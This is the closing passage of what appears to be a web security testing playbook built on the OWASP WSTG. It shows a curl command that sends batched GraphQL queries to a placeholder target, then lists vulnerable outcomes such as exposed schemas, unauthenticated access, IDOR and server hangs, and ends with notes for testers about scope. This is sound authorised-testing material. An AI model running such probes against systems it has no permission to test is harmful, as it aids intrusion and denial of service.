# Batch queries
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"query1"},{"query":"query2"}]'
```

**Expected Output (Vulnerable):**
```
Introspection enabled (schema exposed)
All data types enumerated
Query without auth succeeds
Sensitive data exposed
IDOR in GraphQL fields
Complex query hangs server
Batch processing amplifies requests
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL

---

## End of Playbook

This playbook covers all WSTG test items with practical commands, payloads, and expected outputs. Use it as a reference during testing to ensure comprehensive coverage.

**Notes for Testers:**
- Mark **Pending** status as **Pass** or **Fail** based on test results
- Document all findings with evidence
- Keep comprehensive notes for the report
- Test in the approved scope only
- Verify results multiple times to reduce false positives
